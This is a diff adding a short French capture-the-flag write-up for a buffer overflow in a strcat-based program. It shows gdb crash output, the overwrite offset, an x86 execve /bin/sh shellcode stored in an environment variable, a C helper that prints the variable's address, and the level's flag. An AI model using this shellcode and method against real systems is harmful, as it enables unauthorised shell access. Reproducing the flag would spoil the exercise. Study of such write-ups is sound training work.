@@ -1,0 +1,34 @@
+1. Pendant les premiers tests on remaque deja que le programme segfault.
+2. On ouvre gdb pour en savoir plus.
+3. On remarque que le '\0' de dest est remplacer par 32 juste avant le `strcat`.
+4. On ecrit donc un exploit utilisant cette vulnerabilite.
+5. La seconde entree est responsable de l'overflow.
+   ```
+   (gdb) r
+    -
+   AAAAAAAAAAAAAAAAAAAA
+    -
+   BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+   Program received signal SIGSEGV, Segmentation fault.
+   0x42424242 in ?? ()
+   ```
+6. L'offset est de 9.
+7. On se rends compte qu'il n'y a pas la place pour mettre directement le shellcode, on utilise donc une variable d'environnement.
+   ```
+   export SHELLCODE="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+   ```
+8. On ecrit un petit programme pour connaitre l'addresse de la variable.
+   ```
+   #include <stdio.h>
+   #include <stdlib.h>
+
+   int main ()
+   {
+	printf("%p\n", getenv("SHELLCODE"));
+	return 0;
+   }
+   ```
+9. Il suffit maintenant de jmp sur cette addresse pour ouvrir notre shell.
+
+> Flag: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
